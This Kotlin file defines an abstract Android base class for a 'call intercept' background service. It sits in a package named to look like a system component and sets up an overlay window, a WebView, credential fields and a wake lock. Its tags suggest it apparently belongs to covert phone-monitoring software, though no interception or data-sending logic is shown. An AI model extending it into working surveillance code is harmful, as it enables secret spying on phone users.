package com.android.services.services.callIntercept

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.WindowManager
import android.webkit.WebView
import com.android.services.interfaces.IBackgroundProcessing

abstract class CallInterceptProcessingBase(
    val applicationContext: Context,
) : IBackgroundProcessing {

    protected val windowManagerFlagOverlay =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
    protected var mWindowManager: WindowManager? = null
    protected var mWebView: WebView? = null
    protected val mHandler by lazy {
        Handler(Looper.getMainLooper())
    }

    protected var loadingFinished = true
    protected var redirect = false
    protected var clientUserName = ""
    protected var clientPassword = ""
    internal var wakeLock: PowerManager.WakeLock? = null

    companion object {
        internal const val TAG = "CallIntercept"
        internal const val TAG_CALL_INTERCEPT_BUG_WORK = "myApp:TOSCallInterceptWork"
        internal const val CALL_INTERCEPT_NOTIFICATION_ID = 120

        @JvmStatic
        var view360BugStatus: String? = null
        const val CALL_INTERCEPT_PUSH="CALLINTERCEPTPUSH"
    }

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent)
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            parseIntent(intent)
        }
        return Service.START_STICKY
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}